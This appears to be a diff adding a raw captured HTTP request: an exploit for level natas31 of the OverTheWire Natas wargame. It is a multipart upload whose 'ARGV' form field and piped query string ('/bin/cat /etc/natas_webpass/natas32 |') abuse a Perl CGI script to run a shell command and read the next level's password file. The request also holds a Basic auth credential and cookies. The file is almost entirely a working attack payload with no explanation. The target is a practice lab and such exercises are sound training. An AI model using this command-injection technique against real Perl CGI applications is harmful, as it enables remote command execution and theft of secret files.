@@ -1,0 +1,32 @@
+POST /index.pl?/bin/cat%20/etc/natas_webpass/natas32%20| HTTP/1.1
+Host: natas31.natas.labs.overthewire.org
+Content-Length: 400
+Cache-Control: max-age=0
+Authorization: Basic bmF0YXMzMTpoYXk3YWVjdXVuZ2l1S2FlenVhdGh1azliaWluMHB1MQ==
+Upgrade-Insecure-Requests: 1
+User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.100 Safari/537.36
+Origin: http://natas31.natas.labs.overthewire.org
+Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryKVRjIZSWfEUmBx52
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3
+Referer: http://natas31.natas.labs.overthewire.org/index.pl
+Accept-Encoding: gzip, deflate
+Accept-Language: pt-PT,pt;q=0.9,en-GB;q=0.8,en;q=0.7,en-US;q=0.6
+Cookie: __cfduid=d09b9ae548c976f9de9d988036a221f891554119078; __utma=176859643.1996784735.1554146842.1561818327.1561832534.35; __utmz=176859643.1554146842.1.1.utmcsr=(direct)|utmccn=(direct)|utmcmd=(none)
+Connection: close
+
+------WebKitFormBoundaryKVRjIZSWfEUmBx52
+Content-Disposition: form-data; name="file";
+Content-Type: text/plain
+
+ARGV
+------WebKitFormBoundaryKVRjIZSWfEUmBx52
+Content-Disposition: form-data; name="file"; filename="sample.csv"
+Content-Type: application/octet-stream
+
+Random data
+
+------WebKitFormBoundaryKVRjIZSWfEUmBx52
+Content-Disposition: form-data; name="submit"
+
+Upload
+------WebKitFormBoundaryKVRjIZSWfEUmBx52--
